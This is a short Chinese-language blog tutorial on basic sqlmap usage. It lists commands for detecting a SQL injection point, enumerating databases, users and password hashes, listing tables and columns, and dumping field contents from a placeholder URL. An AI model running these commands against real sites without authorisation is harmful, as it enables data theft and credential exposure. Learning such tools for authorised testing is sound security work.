---
title: Sqlmap-1 基础使用操作
date: 2019-4-19 21:44:00
categories: Sqlmap的使用
---

sqlmap使用教程

**1.检测注入点是否可用**
sqlmap.py -u "url"
-u 输入指定注入点url

**2.若需要用户输入[y/n]，系默认需添加一个参数**
sqlmap.py -u "url" --batch
注入结果显示
(1)注入参数id为GET注入，注入类型有四种分别为boolean-based、error-based、time-based blind、union query
(2)web服务器系统为linux-centOS 7-1708
(3)web应用技术为 apache 2.4.6 php 5.4.16
(4)数据库类型为mysql 5

**3.爆库**
一条命令即可爆出该sqlserver所有数据库名称
sqlmap.py -u "url" --dbs

**4.web使用当前的数据库**
sqlmap.py -u "url" --current-db

**5.web数据库使用账户**
sqlmap.py -u "url" --current-user

**6.列出mysql所有用户**
sqlmap.py -u "url" --users

**7.数据库账户与密码**
sqlmap.py -u "url" --password

**8.列出数据库中的表**
sqlmap.py -u "url" -D 数据库名称 --tables
参数：
-D：指定数据库名称
--tables：列出表

**9.列出表中的字段**
sqlmap.py -u "url" -D 数据库名称 -T 表名称 --columns
参数：
-D：指定数据库名称
-T：指定要列出字段的表
--columns：指定列出字段

**10.爆字段内容**
sqlmap.py -u "url" -D 数据库名称 -T 表名称 -C 字段名
参数：
-C：指定要爆的字段
--dump：将结果盗出

**11.如果字段内容太多，需要花费很多时间。可以指定导出特定范围的字段内容，命令如下：**
sqlmap.py -u "url" -D 数据库名称 -T 表名称 -C 字段名 --start 1 --stop 10 --dump
参数：
--start：指定开始的行
--stop：指定结束的行


